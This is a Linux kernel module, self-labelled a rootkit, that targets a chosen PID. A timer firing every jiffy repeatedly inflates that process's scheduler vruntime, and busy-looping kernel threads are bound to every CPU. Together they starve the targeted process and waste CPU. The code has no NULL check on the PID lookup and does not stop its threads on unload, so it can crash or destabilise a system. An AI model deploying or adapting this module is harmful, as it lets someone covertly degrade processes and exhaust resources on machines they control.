#define DMESG_ALIAS "ROOTKIT_LOG"
#define PDEBUG(fmt,args...) printk(KERN_DEBUG "%s: "fmt,DMESG_ALIAS, ##args)
#define PERR(fmt,args...) printk(KERN_ERR "%s: "fmt,DMESG_ALIAS, ##args)
#define PINFO(fmt,args...) printk(KERN_INFO "%s: "fmt,DMESG_ALIAS, ##args)
#define BUILD_BUG_ON_INVALID(e) ((void)(sizeof((__force long)(e))))


#include <linux/module.h>
#include <linux/kernel.h>        
#include <linux/sched.h>  		
#include <linux/proc_fs.h>
#include <linux/pid.h>
#include <linux/pid_namespace.h>
#include <linux/timer.h>             //kernel mode timer library
#include <linux/init.h>              //for freeing shared memories
#include <linux/cpumask.h>
#include <linux/delay.h>
#include <linux/kthread.h>


#define __param(type, name, init, msg)	\
	static type name = init;			\
	module_param(name, type, 0444);		\
	MODULE_PARM_DESC(name, msg);

__param(int, pid, 0, "PID number");

/**
 * @brief function declerations 
 */
static void update_vruntime(struct timer_list *timer);
static uint64_t _max_vruntime(void);
static void init_timer(void);
static void init_priority_task(void);
static void init_kthreads(void);
static int dummy_kthread_func(void* data);


 /**
 * @brief variables used in this module
 */
static struct task_struct* priority_task;
static uint64_t vruntime_before = 0;
static struct timer_list my_timer;
static long int timer_data = 0;
struct task_struct* cpu_kthreads[100];
struct task_struct* cpu_kthreads2[100];

static uint64_t _max_vruntime(void) {
	struct task_struct* task;
	uint64_t max_vruntime = 0;
    for_each_process(task) {
        if (task->se.vruntime > max_vruntime && task->state == TASK_RUNNING) {
			max_vruntime = task->se.vruntime;
		};
    }

	return max_vruntime;
}	


static void update_vruntime(struct timer_list *timer) {
	unsigned long flag;
	uint64_t max_vruntime = 0;	
	
	smp_wmb();
	raw_spin_lock_irqsave(&priority_task->pi_lock, flag);
	max_vruntime = _max_vruntime();
	priority_task->se.vruntime = max_vruntime + 100000000000;
	//printk("----------------------------------------\n");
	raw_spin_unlock_irqrestore(&priority_task->pi_lock, flag);

	mod_timer(&my_timer, jiffies);
}

static void init_timer(void) {
	int ret;
		
	timer_setup(&my_timer, update_vruntime, timer_data);
	ret = mod_timer(&my_timer, jiffies);
	if (ret)
		PERR("Can't set timer, error occurred\n");

}

static void init_priority_task(void) {
	struct pid *pid_struct;

	pid_struct = find_get_pid(pid);
	priority_task = pid_task(pid_struct, PIDTYPE_PID);
	
	// check the validity of the task.
	// BUILD_BUG_ON_INVALID(priority_task);

	vruntime_before = priority_task->se.vruntime;
}

static int dummy_kthread_func(void* data) {
    bool freeze;
    while (!kthread_freezable_should_stop(&freeze))
    {
    }
    printk(KERN_INFO "Thread Stopping\n");
    do_exit(0);
    return 0;
}

static void init_kthreads(void) {
	int i;
    // Creating kthread that are bound to cpu
    for (i = 0; i < num_online_cpus(); i++) {
        cpu_kthreads[i] = kthread_create(dummy_kthread_func, NULL, "dummy_kthread");
        cpu_kthreads2[i] = kthread_create(dummy_kthread_func, NULL, "dummy_kthread2");


        kthread_bind(cpu_kthreads[i], i);
        kthread_bind(cpu_kthreads2[i], i);

        if (cpu_kthreads[i]) {
            wake_up_process(cpu_kthreads[i]);
            wake_up_process(cpu_kthreads2[i]);
        }
    }
}


/*
 * Function called when loading the kernal module.
 */
int init_module(void) {
	PINFO("Rootkit loaded.\n");

	init_kthreads();

	init_priority_task();

	init_timer();

    return 0;
}


/*
 * Function called when unloading the kernal module.
 */
void cleanup_module(void) {
	PINFO("Rootkit unloaded.\n");
	
	del_timer(&my_timer);

	priority_task->se.vruntime = vruntime_before;
}

 /**
 * @brief module descriptions
 */
MODULE_LICENSE("GPL");
